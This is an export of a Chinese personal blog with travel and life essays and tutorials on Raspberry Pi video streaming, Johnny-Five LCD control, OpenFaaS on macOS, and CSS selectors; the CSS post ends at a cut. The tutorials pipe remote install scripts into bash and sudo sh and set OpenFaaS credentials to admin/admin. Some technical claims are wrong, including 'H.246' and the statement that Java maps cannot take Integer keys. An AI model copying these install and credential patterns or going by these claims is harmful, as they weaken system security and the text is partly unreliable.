<p><img  src="https://pic.izhaoo.com/20210613201045.jpg"  ><span class="image-caption">囊炒肉</span></p>
<p>yysy，改良后的馕 yyds，我可以每天只吃烤馕。</p>
<p><img  src="https://pic.izhaoo.com/20210615204726.jpg"  ><span class="image-caption">全疆宴</span></p>
<p>最后一天在乌鲁木齐吃到了全疆宴，应该是结合了内地的做法，是这几天来吃过最好的一顿了。也是最便宜的一顿，美团99元套餐。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>世界啊，好想再爱你。</title>
    <url>/2021/04/20/i-love-you/</url>
    <content><![CDATA[<p>一年时间，仿佛把一辈子过完了。人生苦短，且行且珍惜。珍惜眼前，珍惜身边人。</p>
<span id="more"></span>

<h3 id="女人"><a href="#女人" class="headerlink" title="女人"></a>女人</h3><p><strong>01</strong></p>
<p>最近跟女友吵了一架，三年来第一次吵架，挺没出息的。还是在你生日那一天，三周年那一天，实在是绷不住了。</p>
<p>其实我们都懂，只是碍于表达。</p>
<p>女人其实很懂事，和你一样。</p>
<p><img  src="https://pic.izhaoo.com/20210421012939.jpg"  ><span class="image-caption">我的小潘</span></p>
<p><strong>02</strong></p>
<p>#老樊</p>
<p>我跌跌撞撞奔向你，<br>你也不能一个人离去。<br>我们在一起说过，<br>无论如何一起经历了风雨，<br>平平淡淡安安静静的老去。</p>
<p><img  src="https://pic.izhaoo.com/20210421012846.jpg"  ><span class="image-caption">我们三周年啦</span></p>
<h3 id="父母"><a href="#父母" class="headerlink" title="父母"></a>父母</h3><p><strong>01</strong></p>
<p>#我和母亲</p>
<p>我：妈，我去看场演唱会。<br>妈：钱还够吗？<br>我：妈，我去外面爬爬山。<br>妈：注意安全！</p>
<p><img  src="https://pic.izhaoo.com/20210421013107.jpg"  ><span class="image-caption">我的母亲</span></p>
<p><strong>02</strong></p>
<p>我一直佩服我爸。从小就失去了妈，十七岁那年，踏上离家的火车外出闯荡。虽没挣到大钱，却带我走过南南北北。<br>我何尝不是呢？一人去了深圳。<br>我一直不理解我妈。去绍兴打工，没有嫁在那边成为绍兴人，还是回了家。<br>我何尝不是呢？终究还是回来了。</p>
<p><img  src="https://pic.izhaoo.com/20210421013050.jpg"  ><span class="image-caption">我的父亲</span></p>
<p><strong>03</strong></p>
<p>#人有四个阶段</p>
<p>第一阶段，爸妈你们好普通啊。<br>第二阶段，我好没出息啊。<br>第三阶段，孩子你努力啊。<br>第四阶段，年轻人，你要饿死了啦。</p>
<h3 id="朋友"><a href="#朋友" class="headerlink" title="朋友"></a>朋友</h3><p><strong>01</strong></p>
<p>今日离职，开启短暂的自由生活，叕跟室友蹲阳台。<br>烟抽不进，燃着；酒喝不下，立着；一杯五十度的开水，一蹲到天明。</p>
<p><img  src="https://pic.izhaoo.com/20210421012956.jpg"  ><span class="image-caption">烟酒无愁</span></p>
<p><strong>02</strong></p>
<p>#有些人</p>
<p>有些人，刚成自由人，编辑器一开下一轮。<br>有些人，一通拆迁电话，一千万兜里揣。<br>有些人，奋斗一整年，没考上研。<br>有些人，坐拥三套房，南下奋斗。<br>有些人，一锅一碗，一个人的八合里。<br>有些人，一包一棍，一个人的旅程。<br>有些人，生来萧山人，祖祖辈辈萧山人。<br>有些人，老婆杭州人，还是妇联主席。<br>…<br>有些烟，抽着抽着就灭了；<br>有些酒，喝着喝着就醒了；<br>有些人，走着走着就散了。<br>愿我们，漂泊一生，归来仍是少年。</p>
<p><img  src="https://pic.izhaoo.com/20210421013030.jpg"  ><span class="image-caption">越想越气</span></p>
<h3 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h3><p><strong>01</strong></p>
<p>第一次做 PM，技术菜，脾气大。不是我的事，为什么要来找我？这锅我可不背，爱找谁找谁！险些 delay，最后还是师兄帮忙兜了底。<br>最后一次做 PM，真诚对待每个人，全程跟进。离职那天，同事们都送来祝福，小伙子真不戳，期待你早日归来。</p>
<p>打工人，说难也难，说易也易。无非是逢山开路，遇水架桥，借事修人。</p>
<p>走的仓促，实习总结写了一半，没来的及感谢。狗哥：只要你毕业后不溜，就不仓促。</p>
<p><img  src="https://pic.izhaoo.com/20210421012912.jpg"  ><span class="image-caption">实习记忆</span></p>
<h3 id="我"><a href="#我" class="headerlink" title="我"></a>我</h3><p><strong>01</strong></p>
<p>#老男孩</p>
<p>生活像一把无情刻刀，<br>改变了我们模样。<br>未曾绽放就要枯萎吗，<br>我有过梦想。<br>青春如同奔流的江河，<br>一去不回来不及道别，<br>只剩下麻木的我没有了当年的热血。</p>
<p><img  src="https://pic.izhaoo.com/20210421013013.jpg"  ><span class="image-caption">兆兆本兆</span></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>旅行</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 - 摄像头推流</title>
    <url>/2021/02/28/raspi-camera-push-stream/</url>
    <content><![CDATA[<p>树莓派中通过摄像头推送视频流的一些方案。</p>
<span id="more"></span>

<p>&lt;封面摄于浙江·新昌的乡村田间，落日残霞进行后期处理而成，有点北极光的感觉。&gt;</p>
<h3 id="安装摄像头"><a href="#安装摄像头" class="headerlink" title="安装摄像头"></a>安装摄像头</h3><ol>
<li>将 CSI 摄像头串口插入树莓派对应的凹槽。</li>
<li>连接完成后命令行输入 <code>sudo raspi-config</code>，Interface Options =&gt; Camera，启动摄像头并重启。</li>
</ol>
<h3 id="raspivid"><a href="#raspivid" class="headerlink" title="raspivid"></a>raspivid</h3><p>raspivid 是 Raspberry PI OS 内置的视频采集工具，可以直接使用摄像头采集视频并进行推流。</p>
<p>Tips: 64 位系统暂不支持该工具，请使用 32 位系统。</p>
<h5 id="TCP（H-246-裸流）"><a href="#TCP（H-246-裸流）" class="headerlink" title="TCP（H.246 裸流）"></a>TCP（H.246 裸流）</h5><p>执行以下命令可直接以 <strong>TCP</strong> 形式推送 <strong>H.246</strong> 格式的裸流。</p>
<pre><code class="bash">$ raspivid -t 0 -w 800 -h 600 -fps 20 -o - | nc -k -l 8080</code></pre>
<h5 id="UDP（H-246-裸流）"><a href="#UDP（H-246-裸流）" class="headerlink" title="UDP（H.246 裸流）"></a>UDP（H.246 裸流）</h5><p>对网络延迟要求较高的场景下，可以使用 UDP 的形式推送裸流，以降低延迟。</p>
<pre><code class="bash">$ raspivid -t 999999 -hf -o -| socat – udp-datagram:192.168.3.6:8080</code></pre>
<h5 id="ffmpeg（RTMP-串流）"><a href="#ffmpeg（RTMP-串流）" class="headerlink" title="ffmpeg（RTMP 串流）"></a>ffmpeg（RTMP 串流）</h5><p>在直播场景下，我们可以借助 ffmpeg 工具对视频进行转码，并推流到 RTMP 服务器；客户端可以连接该服务器接收视频。</p>
<p>在云服务器上执行以下命令搭建 RTMP 推流服务器。</p>
<pre><code class="bash">$ sudo yum install docker  # 安装 Docker
$ sudo docker pull tiangolo/nginx-rtmp  # 拉取镜像
$ sudo docker run -d -p 8080:8080 --name nginx-rtmp tiangolo/nginx-rtmp  # 启动服务</code></pre>
<p>在树莓派上执行以下命令进行推流。</p>
<pre><code class="bash">raspivid -t 0 -w 800 -h 600 -o - | ffmpeg -i - -s 800x600 -f flv -b 800k -r 30 rtmp://www.izhaoo.com:8080/live</code></pre>
<p><a href="https://zhuanlan.zhihu.com/p/52631225">大概是最简单的 rtmp 推流服务器搭建方法</a></p>
<h3 id="MJPG-streamer（MJPEG）"><a href="#MJPG-streamer（MJPEG）" class="headerlink" title="MJPG-streamer（MJPEG）"></a>MJPG-streamer（MJPEG）</h3><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>MJPG-streamer 是一款开源视频推流服务器，以 HTTP 的形式推送 <strong>MJPEG</strong> 格式的视频，该方案实现比较简单，延迟也凑合，大约在 <em>1s</em> 内。<a href="https://baike.baidu.com/item/MJPEG/8966488?fr=aladdin">MJPEG</a> 是一系列 JPG 图片帧组成的视频，只支持以 <code>&lt;img src=&quot;MJPEG 务器地址&quot;&gt;</code> 标签的形式插入 HTML 播放，不能单独分帧处理。所以只适合简单的摄像头监控场景。</p>
<h5 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h5><p>安装依赖库：</p>
<pre><code class="bash">$ sudo apt-get update  # 更新源
$ sudo apt-get install subversion libjpeg8-dev imagemagick libv4l-dev cmake git  # 安装依赖</code></pre>
<p>本地编译项目：</p>
<pre><code class="bash">$ sudo git clone https://github.com/jacksonliam/mjpg-streamer.git  # 下载项目
$ cd mjpg-streamer/mjpg-streamer-experimental  # 进入目录
$ make all  # 编译
$ sudo make install  # 安装</code></pre>
<p>对于普通的 USB 摄像头，通过以下命令即可使用：</p>
<pre><code class="bash">$ cd mjpg-streamer/mjpg-streamer-experimental  # 进入目录
$ ./mjpg_streamer -i &quot;./input_uvc.so&quot; -o &quot;./output_http.so -w ./www&quot;  # 推送视频</code></pre>
<p>打开浏览器输入 <code>http://树莓派IP:8080/?action=stream</code> 即可访问视频。</p>
<h5 id="CSI-摄像头安装依赖"><a href="#CSI-摄像头安装依赖" class="headerlink" title="CSI 摄像头安装依赖"></a>CSI 摄像头安装依赖</h5><p>若是使用树莓派的 CSI 摄像头，还需要补充安装一些硬件支持依赖。</p>
<pre><code class="bash">$ curl https://www.linux-projects.org/listing/uv4l_repo/lpkey.asc | sudo apt-key add -  # 下载并安装密钥
$ vim sudo nano /etc/apt/sources.list  # 打开依赖源文件</code></pre>
<p>在文件的最后一行加入： <code>deb https://www.linux-projects.org/listing/uv4l_repo/raspbian/stretch stretch main</code>，键入 <code>:wq</code> 保存。</p>
<pre><code class="bash">$ sudo apt-get update  # 更新源
$ sudo apt-get install uv4l uv4l-raspicam uv4l-raspicam-extras  # 安装依赖驱动
$ sudo reboot  # 重启</code></pre>
<p>重启后输入以下命令继续安装依赖：</p>
<pre><code class="bash">$ sudo pkill uv4l  # 关闭进程
$ sudo apt-get update  # 更新源
$ sudo apt-get install uv4l-uvc uv4l-xscreen uv4l-mjpegstream  # 安装依赖
$ sudo reboot  # 重启</code></pre>
<p>重启后输入以下命令开始推送视频：</p>
<pre><code class="bash">$ sudo modprobe bcm2835-v4l2  # 打开摄像头
$ cd mjpg-streamer/mjpg-streamer-experimental  # 进入目录
$ ./mjpg_streamer -i &quot;./input_uvc.so -d /dev/video0 -n -y -f 25 -r 640x480&quot; -o &quot;./output_http.so -n -w /usr/local/www&quot;  # 推送视频</code></pre>
<p>打开浏览器输入 <code>http://树莓派IP:8080/?action=stream</code> 即可访问视频。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>raspberrypi</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派 - JS 驱动 LCD1602</title>
    <url>/2021/02/03/raspi-johnny-five-lcd1602/</url>
    <content><![CDATA[<p>树莓派使用 johnny-five.js 库驱动 LCD1602 输出文字。</p>
<span id="more"></span>

<p>&lt;封面摄于浙江·安吉的凤凰山，大一在这些玩了半年树莓派，现在用树莓派来写毕设，不忘初心，笑。&gt;</p>
<p>最近想用树莓派驱动 IoT 写个毕设，经过一番调研选择了 Johnny-Five 库，咱前端人必须用 JS 干啥都行。开始前先驱动个 LCD1602 试试。 LCD1602 我选择的是 I2C 驱动的，既省线，又不用拖个面包板。</p>
<h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>这里我们选择用 <a href="https://github.com/nvm-sh/nvm">nvm</a> 安装，执行以下命令：</p>
<pre><code class="bash">$ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | bash  # 安装 nvm
$ source ~/.bashrc  # 刷新 bash 命令
$ nvm install node  # 安装最新 Node.js</code></pre>
<p>执行一下 <code>node -v</code> 和 <code>npm --version</code> 查看是否安装成功。</p>
<h3 id="编译-pigpio"><a href="#编译-pigpio" class="headerlink" title="编译 pigpio"></a>编译 pigpio</h3><p>Johnny-Five 依赖于 <a href="https://github.com/joan2937/pigpio">pigpio</a>，但是 Johnny-Five 库中集成的 pigpio 版本太老，不支持 64 位的系统，使用我们需要手动编译最新版本的 pigpio。</p>
<pre><code class="bash">$ git clone https://github.com/joan2937/pigpio.git  # 下载最新版
$ unzip pigpio-master.zip  # 解压
$ cd pigpio-master  # 进入目录
$ make  # 编译
$ make install # 安装</code></pre>
<h3 id="安装-Johnny-Five"><a href="#安装-Johnny-Five" class="headerlink" title="安装 Johnny-Five"></a>安装 Johnny-Five</h3><p>Johnny-Five 需要两个 JS 依赖，<code>johnny-five.js</code> 和 <code>raspi-io.js</code>。</p>
<pre><code class="bash">$ mkdir exp &amp;&amp; cd exp  # 新建项目
$ npm init # 初始化
$ npm i johnny-five raspi-io --save
$ nano index.js</code></pre>
<p>输入以下内容并保存：</p>
<pre><code class="javascript">const &#123; RaspiIO &#125; = require(&quot;raspi-io&quot;);
const five = require(&quot;johnny-five&quot;);

const board = new five.Board(&#123;
  io: new RaspiIO()
&#125;);

board.on(&quot;ready&quot;, function() &#123;
  const lcd = new five.LCD(&#123; 
  controller: &quot;PCF8574T&quot;  // 板子的型号
&#125;);
  lcd.print(&quot;Hello, World&quot;);
&#125;);</code></pre>
<p>请查看板子背部芯片上刻着的型号正确填写，PCF8574、PCF8574A、PCF8574T、PCF8574AT。</p>
<p>Johnny-Five 有个坑，会导致文字无法正确输出只会输出一个个方块，需要修复一下，详见：<a href="https://github.com/rwaldron/johnny-five/issues/1639">Raspberry and I2C LCD1602 with PCF8574T controller does not show text but only squares</a></p>
<p>cd 到 <code>node_modules/johnny-five/lib/lcd.js</code>，将 <code>this.io.i2cWrite(this.address, this.memory);</code> 改成 <code>this.io.i2cWrite(this.address, [this.memory]);</code>，保存即可。</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p><strong>接线</strong></p>
<p>LCD1602 有四根引脚，按如关联方式接入树莓派：</p>
<table>
<thead>
<tr>
<th>LCD</th>
<th>树莓派</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>GND</td>
<td>6</td>
<td>接地</td>
</tr>
<tr>
<td>VCC</td>
<td>4</td>
<td>电源（5v or 3.3v）</td>
</tr>
<tr>
<td>SDA</td>
<td>3</td>
<td>数据信号</td>
</tr>
<tr>
<td>SCL</td>
<td>5</td>
<td>控制信号</td>
</tr>
</tbody></table>
<p>连接完成后命令行输入 <code>sudo raspi-config</code>，Interface Options =&gt; I2C，启动 <em>I2C</em> 并重启。</p>
<p>重启后命令行输入 <code>i2cdetect -y -r 1</code>，若显示如下则说明 I2C 连接成功。</p>
<pre><code class="bash">     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:          -- -- -- -- -- -- -- -- -- -- -- -- -- 
10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
20: -- -- -- -- -- -- -- 27 -- -- -- -- -- -- -- -- 
30: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
60: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
70: -- -- -- -- -- -- -- -- </code></pre>
<p><strong>运行</strong></p>
<p>输入 <code>sudo node index.js</code> 运行程序即可看到 LCD 输出了字符。</p>
<p><img  src="https://pic.izhaoo.com/20210203152622.jpg"  ><span class="image-caption">输出字符</span></p>
<p>这里只是简单的做了个输出示范，开发中对应的 API 可以查看<a href="http://johnny-five.io/api/lcd/">官方文档</a>。</p>
<p>Johnny-Five 这个库还是挺厉害的，基本可以无脑驱动周边常用的元器件，python 能干的事儿，咱 JS 肯定要更优雅。也可以尝试一下 <a href="https://cylonjs.com/">Cylon.js</a> 这个库，博主试了一下有坑，对新版系统支持不好。</p>
<h3 id="踩坑指北"><a href="#踩坑指北" class="headerlink" title="踩坑指北"></a>踩坑指北</h3><p>记录一下踩过的坑：</p>
<ol>
<li>pigpio 需要手动编译最新版本，否则无法驱动 64 位系统。</li>
<li>Johnny-Five 需要修改源码，否则会导致输出不正确。</li>
<li>板子型号确认正确。</li>
<li>运行程序需要 <em>root</em> 权限，请跟 <code>sudo</code> 命令。</li>
<li>运行程序后可能板子上啥也没有，试着拨一下板子背部的旋钮调节一下亮度。<br>（博主调了一天源码没输出，就差给作者打电话了，晚上发现原来板子亮度没开，吐了……）</li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>raspberrypi</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OS 部署 OpenFaas</title>
    <url>/2021/01/27/deploy-openfaas-on-mac/</url>
    <content><![CDATA[<p>在 Mac OS 中部署 OpenFaas，构建 Faas 开发环境。</p>
<span id="more"></span>

<p>Serverless 是近年来比较火的云计算技术；而 Faas（函数即服务）作为 Serverless 中的主流技术之一，基本上呈必然发展趋势。平时开发 Faas 应用我们一般使用阿里云、腾讯云等云服务商提供的云技术产品。本着开源万岁（<del>穷B烧不起钱</del>）的理念，我在 Mac 上部署了开源框架 OpenFaas 作为开发环境，下面是一些笔记。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/78250791">Serverless 基本概念入门</a></p>
</blockquote>
<h3 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h3><p>Mac 安装 Docker 比较简单，直接去官网下载 dmg 包，拖出来安装即可。</p>
<p><a href="https://www.docker.com/products/docker-desktop">Docker Desktop</a></p>
<p>安装完成后双击打开，发现 Docker 服务已经跑起来了，但是 Kubernets 服务还没有安装。</p>
<p>设置硬件配置，建议将内存设置为大于 4GB。</p>
<p><img  src="https://pic.izhaoo.com/20210127203750.jpg"  ><span class="image-caption">设置硬件</span></p>
<p>设置镜像源加速下载：</p>
<pre><code class="json">&#123;
  &quot;debug&quot;: true,
  &quot;experimental&quot;: false,
  &quot;registry-mirrors&quot;: [
    &quot;https://reg-mirror.qiniu.com&quot;,
    &quot;https://docker.mirrors.ustc.edu.cn&quot;,
    &quot;https://dockerhub.azk8s.cn&quot;,
    &quot;https://hub-mirror.c.163.com&quot;,
    &quot;https://registry.docker-cn.com&quot;
  ]
&#125;</code></pre>
<p><img  src="https://pic.izhaoo.com/20210127203823.jpg"  ><span class="image-caption">设置镜像源</span></p>
<p>注意：不要在此处一键安装 Kubernets，会因为缺少依赖跑不起来，后面我们单独安装。</p>
<h3 id="安装-Kubernets"><a href="#安装-Kubernets" class="headerlink" title="安装 Kubernets"></a>安装 Kubernets</h3><p>这里我们使用阿里云的脚本一键安装 Kubernets。</p>
<p><a href="https://github.com/AliyunContainerService/k8s-for-docker-desktop">k8s-for-docker-desktop</a></p>
<p>需要在 Docker-Desktop 中查看 Kubernets 的版本，我这里是 <em>v1.19.3</em>。</p>
<p><img  src="https://pic.izhaoo.com/20210127215825.jpg"  ><span class="image-caption">查看 Kubernets 版本</span></p>
<p>然后将分支切换到对应的版本，下载脚本并执行如下命令。</p>
<pre><code class="bash">cd k8s-for-docker-desktop  # 进入脚本目录
chmod +x ./load_images.sh  # 赋予权限
./load_images.sh  # 执行安装脚本</code></pre>
<p>稍等片刻后安装完成。此时我们在 Docker-Desktop 中设置【开启 Kubernets】，重启 Docker 即可。</p>
<p><img  src="https://pic.izhaoo.com/20210127220650.jpg"  ><span class="image-caption">开启 Kubernets</span></p>
<p><img  src="https://pic.izhaoo.com/20210127220723.jpg"  ><span class="image-caption">重启 Docker</span></p>
<h3 id="安装-OpenFaas"><a href="#安装-OpenFaas" class="headerlink" title="安装 OpenFaas"></a>安装 OpenFaas</h3><p>执行以下命令安装 OpenFaas：</p>
<p><strong>命名空间</strong></p>
<pre><code class="bash">git clone https://github.com/openfaas/faas-netes  # 克隆源码
cd faas-netes  # 进入目录
kubectl apply -f namespaces.yml  # 应用命名空间</code></pre>
<p><strong>设置账号</strong></p>
<p>将以下脚本保存为 <code>pwd.sh</code> 文件并执行，设置用户名和密码。</p>
<pre><code class="sh">kubectl -n openfaas create secret generic basic-auth \
--from-literal=basic-auth-user=admin \  # 用户名 admin
--from-literal=basic-auth-password=admin  # 密码 admin</code></pre>
<pre><code class="bash">chmod +x ./pws.sh  # 赋予权限
./pwd.sh  # 执行安装脚本</code></pre>
<p><strong>部署应用</strong></p>
<pre><code class="bash">kubectl apply -f ./yaml  #部署应用
kubectl get pods -n openfaas  #查看应用运行状态

# 当应用全部启动（Running）时表示安装成功</code></pre>
<p>此时浏览器访问 <code>http://127.0.0.1:31112</code> 输入用户名密码，即可进入 <em>Web GUI</em>。可在该页面部署函数，系统也自带了一些实例函数。</p>
<p><img  src="https://pic.izhaoo.com/20210127221825.jpg"  ><span class="image-caption">Web GUI</span></p>
<h3 id="安装-OpenFaas-CLI"><a href="#安装-OpenFaas-CLI" class="headerlink" title="安装 OpenFaas-CLI"></a>安装 OpenFaas-CLI</h3><p>在实际开发中使用 <em>GUI</em> 并不是很方便，接下来我们安装 <em>CLI</em>，以命令行的形式部署函数。</p>
<p>Mac 中可以使用 <em>brew</em> 一键安装 openfaas-cli：</p>
<pre><code class="bash">brew install openfass-cli  # 使用 brew 安装</code></pre>
<p>也可以使用在线脚本安装：</p>
<pre><code class="bash">curl -sSL https://cli.openfaas.com | sudo sh  # 使用在线脚本安装</code></pre>
<p>测试一下是否安装成功：</p>
<pre><code class="bash">fass-cli help # 打印帮助文档</code></pre>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>接下来部署一个名为 <em>hello</em> 的 Node.js 函数作为示例。</p>
<p>首先先我们去 <a href="https://hub.docker.com/">Docker Hub</a> 注册一个账号。</p>
<p><strong>创建函数</strong></p>
<pre><code class="bash">faas-cli new hello --lang node12 -p zhaoo  # 创建函数</code></pre>
<p><code>--lang node12</code> 表示使用 Node v12，可以使用 <code>faas-cli template store list</code> 打印所有语言模板。<br><code>-p</code> 表示命名前缀，使用刚才创建的 <em>Docker Hub</em> 的用户名即可。</p>
<p><strong>构建函数</strong></p>
<p>函数安装生成环境的依赖并打包构建。</p>
<pre><code class="bash">faas-cli build -f hello.yml  # 构建函数</code></pre>
<p><strong>推送函数</strong></p>
<p>将构建好的函数推送到 <em>Docker Hub</em> 仓库。</p>
<pre><code class="bash">faas-cli push -f hello.yml  # 推送函数</code></pre>
<p>推送完成后可在 <a href="https://hub.docker.com/repositories">Docker Hub 仓库</a> 中查看。</p>
<p><strong>部署函数</strong></p>
<p>从 <em>Docker Hub</em> 仓库中拉取函数源码并部署到生产环境，这里的环境就是本地。</p>
<pre><code class="bash">faas-cli deploy  # 部署函数</code></pre>
<p>部署完成后可以通过 <em>Web GUI</em> 查看到我们部署的函数，点击 <em>INVOKE</em> 按钮可调用函数。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>faas</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>请求参数中的数字键</title>
    <url>/2020/12/18/number-key-for-params/</url>
    <content><![CDATA[<p>在请求参数中使用数字类型作为集合中的键。</p>
<span id="more"></span>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近在业务中遇到一个坑：接口提供方用<strong>数字类型</strong>做集合的<strong>键</strong>，而大部分情况中数字类型会被转换成字符串类型，导致请求失败。</p>
<p>Java 类型表述：<code>Map&lt;Integer, List&lt;String&gt;&gt;</code></p>
<p>转换成 JavaScript 对象如下：</p>
<pre><code class="javascript">&#123;
  996: [&#39;福报&#39;, &#39;肝就完了&#39;],
  965: [&#39;养老&#39;, &#39;工作生活平衡&#39;]
&#125;</code></pre>
<p>但是通过请求传递后，后端接收到的却是：<code>&#123; &#39;996&#39;: [&#39;福报&#39;, &#39;肝就完了&#39;], &#39;965&#39;: [&#39;养老&#39;, &#39;工作生活平衡&#39;] &#125;</code></p>
<h3 id="两种语言支持情况"><a href="#两种语言支持情况" class="headerlink" title="两种语言支持情况"></a>两种语言支持情况</h3><ul>
<li><code>JavaScript</code>: 支持，可以用 Number 类型做为 object 中的键。</li>
<li><code>Java</code>：不支持，不能用 Interger 类型作为 Map 中的键。</li>
</ul>
<p>ps: 这个后端肯定吃了空，手动做了层转化，无语…</p>
<h3 id="三种请求类型支持情况"><a href="#三种请求类型支持情况" class="headerlink" title="三种请求类型支持情况"></a>三种请求类型支持情况</h3><ul>
<li><code>Post (JSON)</code>: 不支持，JSON 为了兼容 Java 等语言，会将<em>数字类型</em>解析成<em>字符串类型</em>。</li>
<li><code>Post (form)</code>: 支持，以表单类型进行传参，Map 项会以 <code>Map[key]</code> 的形式传递，且支持数字类型。</li>
<li><code>Get (URL)</code>: 不支持，通过 URL Params 进行传参，后端默认会以字符串类型接收。</li>
</ul>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
<li>让后端改回数字类型的键。别想了，人都找不到。</li>
<li>以 Post(form) 的形式请求。比较方便，但是只能统一用 Post 方式请求了。许多获取、查询类型的接口不用 Get 看起来很奇怪。</li>
<li>解析。在中间件中使用参数解析函数，通过深度遍历将所有 Map 的键转换成数字类型。</li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS - 元素数量选择器</title>
    <url>/2020/11/16/css-style-for-element-number/</url>
    <content><![CDATA[<p>根据元素数量匹配样式，解决 <strong>向前选择</strong> 和 <strong>重复元素</strong> 问题。</p>
<span id="more"></span>

<p>&lt;封面摄于江苏·南京的先锋书店，打卡网红书店。&gt;</p>
<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><p>今天在给 <code>hexo-theme-zhaoo</code> 写 <strong>文章目录 (toc)</strong>，有个需求：当目录不存在时，不显示标题。</p>
<p><img  src="https://pic.izhaoo.com/20201116195907.png"  ><span class="image-caption">文章目录</span></p>
<p>抽象出 <code>DOM</code> 结构：</p>
<pre><code class="html">&lt;aside class=&quot;toc-wrap&quot;&gt;
  &lt;h3 class=&quot;toc-title&quot;&gt;文章目录：&lt;/h3&gt;
  &lt;ol class=&quot;toc&quot;&gt;...&lt;/ol&gt;
&lt;/aside&gt;</code></pre>
<p>最直接的思路是匹配 <code>.toc</code>，若该元素不存在，则将它前面的 <code>.toc-title</code> 隐藏。但是 <code>CSS</code> 没有向前选择，因为这样回引起回流。</p>
<p>需要想个办法曲线救国，其实借助它们的公共父元素 <code>.toc-wrap</code> 即可解决，若 <code>.toc-wrap</code> 只有一个子元素则将它隐藏。如下：</p>
<pre><code class="css">.toc-wrap
  &amp; &gt; :only-child
    display none</code></pre>
<p>🌰 很简单，却值得思考一下，<code>CSS</code> 真的不能 “向前选择” 嘛？</p>
<h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><p>在构建 <em>栅格化</em> 布局的时候，早期的 <code>BootStrap</code> 使用了大量的重复代码，类似这样：</p>
<pre><code class="css">@media (min-width: 768px) &#123;
  .col-md-1 &#123; flex: 0 0 8.33333%; max-width: 8.33333%; &#125;
  .col-md-2 &#123; flex: 0 0 16.6667%; max-width: 16.6667%; &#125;
  .col-md-3 &#123; flex: 0 0 25%; max-width: 25%; &#125;
  .col-md-4 &#123; flex: 0 0 33.3333%; max-width: 33.3333%; &#125;
  .col-md-5 &#123; flex: 0 0 41.6667%; max-width: 41.6667%; &#125;
  .col-md-6 &#123; flex: 0 0 50%; max-width: 50%; &#125;
  .col-md-7 &#123; flex: 0 0 58.3333%; max-width: 58.3333%; &#125;
  .col-md-8 &#123; flex: 0 0 66.6667%; max-width: 66.6667%; &#125;
  .col-md-9 &#123; flex: 0 0 75%; max-width: 75%; &#125;
  .col-md-10 &#123; flex: 0 0 83.3333%; max-width: 83.3333%; &#125;
  .col-md-11 &#123; flex: 0 0 91.6667%; max-width: 91.6667%; &#125;
  .col-md-12 &#123; flex: 0 0 100%; max-width: 100%; &#125;
&#125;
@media (min-width: 992px) &#123;
  .col-lg-1 &#123; flex: 0 0 8.33333%; max-width: 8.33333%; &#125;
  .col-lg-2 &#123; flex: 0 0 16.6667%; max-width: 16.6667%; &#125;
  .col-lg-3 &#123; flex: 0 0 25%; max-width: 25%; &#125;
  .col-lg-4 &#123; flex: 0 0 33.3333%; max-width: 33.3333%; &#125;
  .col-lg-5 &#123; flex: 0 0 41.6667%; max-width: 41.6667%; &#125;
  .col-lg-6 &#123; flex: 0 0 50%; max-width: 50%; &#125;
  .col-lg-7 &#123; flex: 0 0 58.3333%; max-width: 58.3333%; &#125;
  .col-lg-8 &#123; flex: 0 0 66.6667%; max-width: 66.6667%; &#125;
  .col-lg-9 &#123; flex: 0 0 75%; max-width: 75%; &#125;
  .col-lg-10 &#123; flex: 0 0 83.3333%; max-width: 83.3333%; &#125;
  .col-lg-11 &#123; flex: 0 0 91.6667%; max-width: 91.6667%; &#125;
  .col-lg-12 &#123; flex: 0 0 100%; max-width: 100%; &#125;
&#125;</code></pre>
<p>在使用 <code>CSS 预处理器</code> 后可以简化成下面这样，但是编译后依然存在大量重复代码。</p>
<pre><code class="css">for $i in 1 .. 12
  .col-&#123;$i&#125;
    col-attr round(($i * 100 / 12) %, 6)
@media (min-width 576px)
  for $i in 1 .. 12
    .col-sm-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)
@media (min-width 768px)
  for $i in 1 .. 12
    .col-md-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)
@media (min-width 992px)
  for $i in 1 .. 12
    .col-lg-&#123;$i&#125;
